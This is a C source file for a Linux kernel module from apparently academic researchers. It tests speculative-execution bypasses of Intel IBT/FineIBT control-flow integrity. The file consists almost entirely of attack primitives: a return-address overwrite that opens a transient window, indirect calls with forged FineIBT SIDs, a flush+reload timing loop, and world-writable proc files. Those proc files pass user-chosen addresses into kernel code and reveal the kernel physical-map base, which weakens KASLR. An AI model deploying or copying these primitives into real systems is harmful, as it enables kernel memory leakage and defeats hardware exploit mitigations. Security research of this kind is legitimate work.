/*
 * Friday, October 27th 2023
 *
 * Sander Wiebing - s.j.wiebing@vu.nl
 * Alvise de Faveri Tron - a.de.faveri.tron@vu.nl
 * Herbert Bos - herbertb@cs.vu.nl
 * Cristiano Giuffrida - giuffrida@cs.vu.nl
 *
 * Vrije Universiteit Amsterdam - Amsterdam, The Netherlands
 *
 */

#define pr_fmt(fmt) "%s:%s: " fmt, KBUILD_MODNAME, __func__

#include <linux/module.h>
#include <linux/moduleparam.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/stat.h>
#include <linux/slab.h>
#include <linux/proc_fs.h>
#include <linux/delay.h>

#include "lib.h"

#define ITERATIONS 10000

#define FINE_IBT_SID_CORRECT 0xCAFED00D
// #define FINE_IBT_SID_CORRECT 0x734ac845
#define FINE_IBT_SID_FAKE    0xDEADCAFE



MODULE_AUTHOR("Sander Wiebing");
MODULE_DESCRIPTION("IBT Testing");
MODULE_LICENSE("GPL");

extern void __cfi_c_target(void);
extern void c_target(void);

extern void no_ibt_target(void);

static void * cfi_target = __cfi_c_target;

static uint64_t selected_sid = FINE_IBT_SID_FAKE;
static uint64_t sid_options[] = {FINE_IBT_SID_CORRECT, FINE_IBT_SID_FAKE};


static uint64_t a_target0(uint64_t arg0, uint64_t arg1){
    return (uint64_t) 0;
}

__attribute__((aligned(4096))) static uint64_t a_target1(uint64_t arg0, uint64_t arg1){

    asm volatile (
        ".rept 16\n"
            "mov (%rsi), %rsi\n"
        ".endr\n"
    );
    return 0;

}


typedef uint64_t a_target_t(uint64_t arg0, uint64_t arg1);

a_target_t *a_ftable[] = {a_target0, a_target1};

noinline void a_caller(a_target_t * ftable[], uint8_t * fr_buf, uint64_t idx) {

    ftable[idx](0, (uint64_t) fr_buf);

}

noinline void overwrite_return(void) {

       asm volatile(
            "lea 12(%%rip), %%rdx\n"
            "mov  %%rdx, (%%rsp)\n"
            "clflush (%%rsp)\n"
            "mfence\n"
            "ret\n"
            "pop %%rbp\n"
            "pop %%rbp\n"
            "ret"
            :::
    );
}

noinline void do_transient(uint8_t * fr_buf, uint64_t sid, void * target)
{

    asm volatile(
            "mov  %%edx, %%r10d\n"
            "call %P0\n"

            /* Transient window starts here */
            "call *%%rax\n"

            "capture_ret_spec_%=:\n"
            "pause; LFENCE\n"
            "jmp capture_ret_spec_%=\n"
            :
            : "i"(overwrite_return), "S" (fr_buf), "d" (sid), "a" (target)
            :
    );

}

noinline static uint64_t do_flush_and_reload(uint8_t * fr_buf, uint64_t sid)
{

    uint64_t hits = 0;
    uint64_t t;

    *(volatile uint8_t *) fr_buf;

    mfence();


    for(int iter=0; iter < ITERATIONS; iter++) {


            cpuid_fence();


            clflush(fr_buf);
            cpuid_fence();

            do_transient(fr_buf, sid, cfi_target);

            mfence();


            t = load_time(fr_buf);
            if(t < THR) {
                hits++;
            }

    }

    return hits;
}


static ssize_t mod_perform_ibt_test(struct file *filp, const char *buf, size_t len, loff_t *off)
{
    char kbuf[256];
    uint8_t * user_address;

    memset(kbuf, 0, 256);

    if (copy_from_user(kbuf, buf, min(len, (size_t) 255))) {
		return -EFAULT;
    }


    if (sscanf(kbuf, "%llx", (uint64_t *) &user_address) != 1) {
        return -EFAULT;
    }


    if (!user_address) {
        pr_info("ERROR: User address is NULL\n");
        return -EFAULT;
    }

    do_transient(user_address, 0, no_ibt_target);

    len = strlen(kbuf);
    *off += len;


    return len;

}

static ssize_t mod_perform_fine_ibt_test(struct file *filp, const char *buf, size_t len, loff_t *off)
{
    char kbuf[256];
    uint8_t * user_address;

    memset(kbuf, 0, 256);

    if (copy_from_user(kbuf, buf, min(len, (size_t) 255))) {
		return -EFAULT;
    }


    if (sscanf(kbuf, "%llx", (uint64_t *) &user_address) != 1) {
        return -EFAULT;
    }


    if (!user_address) {
        pr_info("ERROR: User address is NULL\n");
        return -EFAULT;
    }

    do_transient(user_address, selected_sid, cfi_target);

    len = strlen(kbuf);
    *off += len;


    return len;

}


static ssize_t mod_caller_train(struct file *filp, const char *buf, size_t len, loff_t *off) {

    char kbuf[256];
    uint8_t * user_address;

    memset(kbuf, 0, 256);

    if (copy_from_user(kbuf, buf, min(len, (size_t) 255))) {
		return -EFAULT;
    }


    if (sscanf(kbuf, "%llx", (uint64_t *) &user_address) != 1) {
        return -EFAULT;
    }


    if (!user_address) {
        pr_info("ERROR: User address is NULL\n");
        return -EFAULT;
    }

    a_caller(a_ftable, user_address, 1);

    len = strlen(kbuf);
    *off += len;


    return len;

}

static ssize_t mod_caller_test(struct file *filp, const char *buf, size_t len, loff_t *off) {

    char kbuf[256];
    uint8_t * user_address;

    memset(kbuf, 0, 256);

    if (copy_from_user(kbuf, buf, min(len, (size_t) 255))) {
		return -EFAULT;
    }


    if (sscanf(kbuf, "%llx", (uint64_t *) &user_address) != 1) {
        return -EFAULT;
    }


    if (!user_address) {
        pr_info("ERROR: User address is NULL\n");
        return -EFAULT;
    }

    do_transient(user_address, FINE_IBT_SID_FAKE, (void *) ((uint8_t *) a_target1 - 0x10));

    len = strlen(kbuf);
    *off += len;


    return len;

}

#define PHYS_MAP_START 0xffff800000000000
#define PHYS_MAP_END   0xffffc87fffffffff
#define PHYS_ALIGNMENT 1 << 30 // 1 GB

static ssize_t mod_get_phys_map_start(struct file *filp, char *buf, size_t len, loff_t *off)
{
    char kbuf[256];
    uint64_t kern_address;
    int write_len = 0;

    if (*off != 0) {
        return 0;
    }


    for (kern_address = PHYS_MAP_START; kern_address < PHYS_MAP_END; kern_address += PHYS_ALIGNMENT)
    {
        if(virt_addr_valid((uint8_t *) kern_address)) {
            break;
        }

    }

    snprintf(kbuf, 32, "%llx\n", kern_address);

    write_len = min(len, strlen(kbuf));
    *off += write_len;

    if (copy_to_user(buf, kbuf, write_len)) {
        return -EFAULT;
    }

	return write_len;


}

static ssize_t mod_simple_test(struct file *filp, char *buf, size_t len, loff_t *off)
{
    char kbuf[256];
    uint64_t hits;
    uint8_t * fr_buf;
    int write_len = 0;

    if (*off != 0) {
        return 0;
    }

    fr_buf = (uint8_t *) kmalloc(0x1000 * 4, GFP_KERNEL);

    memset(fr_buf, 0x90, 0x1000 * 4);

    if (!fr_buf) {
        pr_err("Error allocating fr_buf\n");
        return 0;
    }


    pr_info("fr_buf %px\n", fr_buf);

    pr_info("a_ftable[1] %px\n", a_ftable[1]);

    hits = do_flush_and_reload(fr_buf, FINE_IBT_SID_CORRECT);

    pr_info("Hits: %lld\n", hits);

    snprintf(kbuf, 255, "Hits: %lld\n", hits);

    write_len = min(len, strlen(kbuf));
    *off += write_len;

    if (copy_to_user(buf, kbuf, write_len)) {
        return -EFAULT;
    }

    kfree(fr_buf);

	return write_len;
}

static ssize_t mod_select_sid(struct file *filp, const char *buf, size_t len, loff_t *off) {
    char kbuf[256];
    unsigned input;


    memset(kbuf, 0, 256);

    if (copy_from_user(kbuf, buf, min(len, (size_t) 255))) {
		return -EFAULT;
    }

    if (sscanf(kbuf, "%u", (unsigned *) &input) != 1) {
        return -EFAULT;
    }

    if (input > 1) {
        pr_info("ERROR: Invalid off_ibt input\n");
        return -EINVAL;
    }

    selected_sid = sid_options[input];

    // pr_info("Selected SID %#llx\n", selected_sid);

    len = strlen(kbuf);
    *off += len;

    return len;
}


static struct proc_ops perform_ibt_test_fops = {
	.proc_write = mod_perform_ibt_test
};

static struct proc_ops perform_fine_ibt_test_fops = {
	.proc_write = mod_perform_fine_ibt_test
};


static struct proc_ops simple_test_fops = {
	.proc_read = mod_simple_test
};

static struct proc_ops phys_map_start_fops = {
	.proc_read = mod_get_phys_map_start
};

static struct proc_ops caller_train_fops = {
	.proc_write = mod_caller_train
};


static struct proc_ops caller_test_fops = {
	.proc_write = mod_caller_test
};

static struct proc_ops select_sid = {
	.proc_write = mod_select_sid
};

static struct proc_dir_entry *proc_dir;

static int __init ibt_check_init(void)
{
    // Create the proc dir

    proc_dir = proc_mkdir("ibt_testing", NULL);

	proc_create("simple_test", 0666, proc_dir, &simple_test_fops);
    proc_create("phys_map_start", 0666, proc_dir, &phys_map_start_fops);

    proc_create("perform_ibt_test", 0666, proc_dir, &perform_ibt_test_fops);

    proc_create("perform_fine_ibt_test", 0666, proc_dir, &perform_fine_ibt_test_fops);

    proc_create("caller_train", 0666, proc_dir, &caller_train_fops);
    proc_create("caller_test", 0666, proc_dir, &caller_test_fops);

    proc_create("select_sid", 0666, proc_dir, &select_sid);

    pr_info("Initialized\n");

	return 0;
}

static void __exit ibt_check_exit(void)
{
	pr_info("exiting\n");
    proc_remove(proc_dir);
}

module_init(ibt_check_init);
module_exit(ibt_check_exit);
